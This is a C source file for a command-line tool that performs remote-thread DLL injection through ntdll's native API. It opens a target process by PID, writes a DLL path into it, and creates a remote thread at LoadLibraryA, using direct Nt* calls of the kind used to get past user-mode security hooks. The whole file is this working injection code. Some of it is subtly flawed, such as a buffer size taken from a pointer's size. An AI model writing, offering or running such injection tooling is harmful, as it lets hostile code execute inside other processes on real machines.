/*
Remote Thread DLL Injection using Native API Functions
*/

#include <stdio.h>
#include <windows.h>
#include <tlhelp32.h>




#define STATUS_SUCCESS 0x00000000L

// Define structs and signature for NtOpenProcess

typedef struct _UNICODE_STRING
{
    USHORT Length;   
    USHORT MaximumLength; 
    WCHAR* Buffer;  
} UNICODE_STRING, * PUNICODE_STRING;


typedef struct _OBJECT_ATTRIBUTES {
    ULONG              Length;
    HANDLE             RootDirectory;
    PUNICODE_STRING    ObjectName;
    ULONG              Attributes;
    PVOID              SecurityDescriptor;
    PVOID              SecurityQualityOfService;
} OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES;


typedef struct _CLIENT_ID 
{
    PVOID              UniqueProcess;
    PVOID              UniqueThread;
} CLIENT_ID, * PCLIENT_ID;


typedef NTSTATUS (NTAPI* NTOpnPrcs)(
    _Out_ PHANDLE ProcessHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_ POBJECT_ATTRIBUTES ObjectAttributes,
    _In_opt_ PCLIENT_ID ClientId
    );


// Define structs and signature for NtAllocateVirtualMemory

typedef NTSTATUS (NTAPI* NtVirtualAlloc)( 
    HANDLE    ProcessHandle,
    PVOID     *BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T   RegionSize,
    ULONG     AllocationType,
    ULONG     Protect
);


// Define structs and signature for NtWriteVirtualMemory phnt/ntmmapi.h
typedef NTSTATUS (NTAPI* NtWriteVirtualMemory)(
    _In_ HANDLE ProcessHandle,
    _In_opt_ PVOID BaseAddress,
    _In_ PVOID Buffer,
    _In_ SIZE_T BufferSize,
    _Out_opt_ PSIZE_T NumberOfBytesWritten
    );

//Define structs and signature for NtProtectVirtualMemory phnt/ntmmapi.h

typedef NTSTATUS (NTAPI* NtProtectVirtualMemory)(
    _In_ HANDLE ProcessHandle,
    _Inout_ PVOID *BaseAddress,
    _Inout_ PSIZE_T RegionSize,
    _In_ ULONG NewProtect,
    _Out_ PULONG OldProtect
    );

// Define structs and signature for NtCreatThreadEx phnt/ntpsapi.h


typedef struct _PS_ATTRIBUTE {
	ULONGLONG Attribute;				
	SIZE_T Size;						
	union {
		ULONG_PTR Value;				
		PVOID ValuePtr;	
	};
	PSIZE_T ReturnLength;	
} PS_ATTRIBUTE, *PPS_ATTRIBUTE;

typedef struct _PS_ATTRIBUTE_LIST {
	SIZE_T TotalLength;					
	PS_ATTRIBUTE Attributes[2];			
} PS_ATTRIBUTE_LIST, *PPS_ATTRIBUTE_LIST;

typedef NTSTATUS (NTAPI* NtCreateThreadEx)(
    _Out_ PHANDLE ThreadHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_opt_ POBJECT_ATTRIBUTES ObjectAttributes,
    _In_ HANDLE ProcessHandle,
    _In_ PVOID StartRoutine, // PUSER_THREAD_START_ROUTINE
    _In_opt_ PVOID Argument,
    _In_ ULONG CreateFlags, // THREAD_CREATE_FLAGS_*
    _In_ SIZE_T ZeroBits,
    _In_ SIZE_T StackSize,
    _In_ SIZE_T MaximumStackSize,
    _In_opt_ PPS_ATTRIBUTE_LIST AttributeList
    );


int GetProcessName(int pid) ;

int main (int argc, char* argv[]){

    LPCWSTR DllPath = argv[2];
    const BYTE* buf;
    buf = (const BYTE*) argv[2];
    size_t bufsize = sizeof(buf);
    size_t  bytesWritten = 0;
    HANDLE hModule ;
    HANDLE hNTDLL;
    PVOID rBuffer = NULL ;
    HANDLE hProcess;
    NTSTATUS status;
    HANDLE hThread;
    
    if (argc < 3 ){
        printf("[!]Usage %s <pid-to-inject> <path-to-dll> \n",argv[0]);
        return 1;
    }
    
    DWORD pid = atoi(argv[1]);
    GetProcessName(pid);

    OBJECT_ATTRIBUTES Obj_Attr = {sizeof(OBJECT_ATTRIBUTES),NULL};
    CLIENT_ID Client_id = {(PVOID)pid,NULL};

    hNTDLL = GetModuleHandle("ntdll");

    NTOpnPrcs NtOpenP = (NTOpnPrcs)GetProcAddress(hNTDLL,"NtOpenProcess");


    status = NtOpenP(&hProcess,PROCESS_ALL_ACCESS,&Obj_Attr,&Client_id);

    if (status != STATUS_SUCCESS){
        printf("Failed to open Process Handle\n");
        return 1;
    }

    NtVirtualAlloc NtVAlloc = (NtVirtualAlloc)GetProcAddress(hNTDLL,"NtAllocateVirtualMemory");
    
    printf("[*]Trying to allocate %d bytes of memory\n",bufsize);

    status = NtVAlloc(hProcess,&rBuffer,0,&bufsize,MEM_COMMIT|MEM_RESERVE,PAGE_EXECUTE_READWRITE);

    if (status != STATUS_SUCCESS){
        printf("[!]Error %x while allocating memory!\n",status);
        return 1;
    }

    printf("[*]Allocated %d bytes of memory in the target process\n[!] Propably rounded up to pagesize\n",bufsize);
    
    NtWriteVirtualMemory NtWriteMem = (NtWriteVirtualMemory)GetProcAddress(hNTDLL,"NtWriteVirtualMemory");

    printf("%d\n",sizeof(buf));
    status = NtWriteMem(
        hProcess,
        rBuffer,
        (PVOID)buf,
        strlen(buf),
        &bytesWritten);


    printf("[*] %ld Bytes written in remote process\n",bytesWritten);
    if (status != STATUS_SUCCESS){
        printf("[!]Error while Writing to process Memory--Abort!\n");
        return 1;
    }

    NtProtectVirtualMemory VmProtect = (NtProtectVirtualMemory)GetProcAddress(hNTDLL,"NtProtectVirtualMemory");

    printf("Trying to alter Protect memory rights on Allocated buffer \n");
    
    ULONG old = PAGE_READWRITE;
    status = VmProtect(hProcess,&rBuffer,&bufsize,(ULONG)PAGE_EXECUTE_READ,&old);

    if (status != STATUS_SUCCESS) {
        printf("[!]Failed to alter rights on allocated memory--ABORT!\n");
        return 1;
    } 

    NtCreateThreadEx CrtThread = (NtCreateThreadEx)GetProcAddress(hNTDLL,"NtCreateThreadEx");

    HANDLE hKernel32 = GetModuleHandle("kernel32");
    
    LPTHREAD_START_ROUTINE load_func = (LPTHREAD_START_ROUTINE)GetProcAddress(hKernel32,"LoadLibraryA");
    

    printf("Trying to create remote Thread \n");
    
    status = CrtThread(
        &hThread,
        THREAD_ALL_ACCESS,
        &Obj_Attr,
        hProcess,
        (LPTHREAD_START_ROUTINE) load_func,
        (PVOID)rBuffer,
        FALSE,
        0,
        0,
        0,
        NULL);

    if (status != STATUS_SUCCESS){
        printf("[!] Error Creating the remote Thread");
        return 1;
    }


    WaitForSingleObject(hThread,INFINITE);
    
    printf("[*]Executed ");

    if (hThread){
        CloseHandle(hThread);
    }
    if (hProcess){
        CloseHandle(hProcess);
    }


    return 0;
}


int GetProcessName (int pid){
    //based in msdn`s paradigms on how to take a snapshot of running processes

    HANDLE hProcessSnap ;
    PROCESSENTRY32 pe32;
    HANDLE hProcess;
    
    hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);

    if (hProcessSnap == INVALID_HANDLE_VALUE){
        printf("Error while snapshoting running processes\n");
        return 1;
    }
    
    pe32.dwSize = sizeof(PROCESSENTRY32);

    hProcess = Process32First(hProcessSnap,&pe32);

    if (hProcess == NULL){
        printf("error Getting the first process!\n");
        return 1;
    }

    while (hProcess) {
        if (pid == pe32.th32ProcessID) {
            printf("[*]Trying to inject to process : %s\n", pe32.szExeFile);
            return 0;
        }
        hProcess = Process32Next(hProcessSnap,&pe32);
    }
    printf("[!]Process Name not found---Abort\n");
    exit(1);

}
